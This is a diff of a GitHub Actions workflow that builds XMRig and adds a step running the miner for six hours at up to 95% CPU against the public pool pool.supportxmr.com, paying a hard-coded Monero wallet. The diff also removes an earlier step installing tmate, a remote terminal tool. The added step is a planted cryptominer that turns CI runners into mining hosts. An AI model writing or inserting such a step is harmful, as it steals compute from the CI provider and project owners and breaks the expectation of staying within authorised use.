@@ -24,26 +24,26 @@ jobs:
           path: ./backup
         continue-on-error: true
 
-      - name: Install prerequisites
-        run: |
-          sudo apt update
-          sudo apt install -y tmate curl unzip sudo net-tools neofetch
-
       - name: Install dependencies
         run: |
-        sudo apt update
-        sudo apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          sudo apt update
+          sudo apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
 
       - name: Clone XMRig
         run: git clone https://github.com/xmrig/xmrig.git
 
       - name: Build XMRig
         run: |
-        cd xmrig
-        mkdir build && cd build
-        cmake ..
-        make -j$(nproc)
-          
+          cd xmrig
+          mkdir build && cd build
+          cmake ..
+          make -j$(nproc)
+
+      - name: Run XMRig miner for 6 hours
+        run: |
+          cd xmrig/build
+          ./xmrig -o pool.supportxmr.com:3333 -u 43dg7Dzeqtd7BmGsctHnnLS4w53NJfwLwfyV8zZuyKjX19dmwn9mhkUPrmrtDaNxBScd4E5EuDJR3bzqzRBrxmia615EkEV -p x --donate-level 1 --cpu-priority 5 --max-cpu-usage=95 &
+          sleep 21600
 
       - name: Restore backup files
         run: |
